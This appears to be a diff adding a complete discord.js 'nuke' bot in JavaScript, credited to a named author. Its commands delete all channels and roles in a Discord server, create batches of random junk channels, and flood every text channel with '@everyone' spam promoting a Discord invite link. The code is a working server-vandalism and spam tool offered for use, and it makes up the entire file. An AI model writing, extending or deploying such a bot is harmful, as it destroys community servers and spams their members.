@@ -1,0 +1,152 @@
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+
+// Replace with your bot token
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers,
+    ],
+});
+
+// Configuration: Adjust speeds in milliseconds
+const config = {
+    deleteDelay: 100, // Delay between channel deletions
+    createAndMessageDelay: 100, // Delay between creating channels or sending messages (1 second)
+};
+
+client.once('ready', () => {
+    console.log(`Logged in as ${client.user.tag}!`);
+});
+
+// Display help information for available commands
+client.on('messageCreate', async (message) => {
+    if (message.content === '!help' && !message.author.bot) {
+        const helpText = `
+**🤖 Available Commands:**
+📁 **\`!nuke channel\`** - Delete all channels.
+🛑 **\`!nuke role\`** - Delete all roles (except the default).
+📢 **\`!nuke spamm <number>\`** - Spam a specified number of messages in all text channels.
+📂 **\`!nuke rchannel <number>\`** - Create a specified number of random channels.
+🌀 **\`!nuke ochannel\`** - Delete all channels and create 20 new random channels.
+        
+⚠️ **Use these commands with caution. They cannot be undone! --Made By zmr48106**
+        `;
+        message.reply(helpText);
+    }
+});
+
+// Nuke command handler
+client.on('messageCreate', async (message) => {
+    if (message.content.startsWith('!nuke') && !message.author.bot) {
+        const member = message.member;
+
+        // Check if the user has Administrator permission
+        if (!member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply('❌ You need Administrator permission to use this command.');
+        }
+
+        const guild = message.guild;
+        const args = message.content.split(' ');
+
+        if (args[1] === 'channel') {
+            // Delete all channels
+            const channels = guild.channels.cache;
+            for (const channel of channels.values()) {
+                if (channel.deletable) {
+                    await channel.delete().catch((err) =>
+                        console.error(`Failed to delete channel ${channel.name}:`, err)
+                    );
+                }
+            }
+
+            // Create a new confirmation channel
+            const confirmationChannel = await guild.channels.create({
+                name: 'command-confirmation',
+                type: 0, // Text channel type
+            });
+
+            // Send confirmation message in the new channel
+            confirmationChannel.send('✅ All channels have been deleted.');
+        } else if (args[1] === 'role') {
+            // Delete all roles (except default)
+            const roles = guild.roles.cache.filter((role) => !role.managed && role.id !== guild.id);
+            for (const role of roles.values()) {
+                await role.delete().catch((err) =>
+                    console.error(`Failed to delete role ${role.name}:`, err)
+                );
+            }
+            message.reply('✅ All roles (except default) have been deleted.');
+        } else if (args[1] === 'spamm') {
+            const numberOfMessages = parseInt(args[2]) || 20;
+
+            if (isNaN(numberOfMessages) || numberOfMessages <= 0) {
+                return message.reply('❌ Please provide a valid number for messages.');
+            }
+
+            const channels = guild.channels.cache.filter((ch) => ch.type === 0);
+            for (const channel of channels.values()) {
+                for (let i = 0; i < numberOfMessages; i++) {
+                    setTimeout(async () => {
+                        await channel.send('@everyone YOOOOOOOOOOOOOOOOOOOOOOOOOOO Join Now https://discord.gg/a7Q3yKmDSw').catch((err) =>
+                            console.error('Failed to send message:', err)
+                        );
+                    }, i * config.createAndMessageDelay);
+                }
+            }
+            message.reply(`✅ ${numberOfMessages} spam messages will be sent in all channels.`);
+        } else if (args[1] === 'rchannel') {
+            const numberOfChannels = parseInt(args[2]) || 20;
+
+            if (isNaN(numberOfChannels) || numberOfChannels <= 0) {
+                return message.reply('❌ Please provide a valid number for channels.');
+            }
+
+            for (let i = 0; i < numberOfChannels; i++) {
+                const randomChannelName = `random-channel-${Math.random().toString(36).substring(2, 8)}`;
+                await guild.channels
+                    .create({
+                        name: randomChannelName,
+                        type: 0, // Text channel type
+                    })
+                    .catch((err) => console.error('Failed to create channel:', err));
+            }
+            message.reply(`✅ ${numberOfChannels} random channels have been created.`);
+        } else if (args[1] === 'ochannel') {
+            // Delete all channels and create 20 new random channels
+            const channels = guild.channels.cache;
+            for (const channel of channels.values()) {
+                if (channel.deletable) {
+                    await channel.delete().catch((err) =>
+                        console.error(`Failed to delete channel ${channel.name}:`, err)
+                    );
+                }
+            }
+
+            for (let i = 0; i < 20; i++) {
+                const randomChannelName = `random-channel-${Math.random().toString(36).substring(2, 8)}`;
+                await guild.channels
+                    .create({
+                        name: randomChannelName,
+                        type: 0, // Text channel type
+                    })
+                    .catch((err) => console.error('Failed to create channel:', err));
+            }
+
+            // Create a new confirmation channel
+            const confirmationChannel = await guild.channels.create({
+                name: 'command-confirmation',
+                type: 0, // Text channel type
+            });
+
+            // Send confirmation message in the new channel
+            confirmationChannel.send('✅ All channels have been deleted, and 20 new random channels have been created.');
+        }
+    }
+});
+
+// Login to Discord
+client.login(BOT_TOKEN);
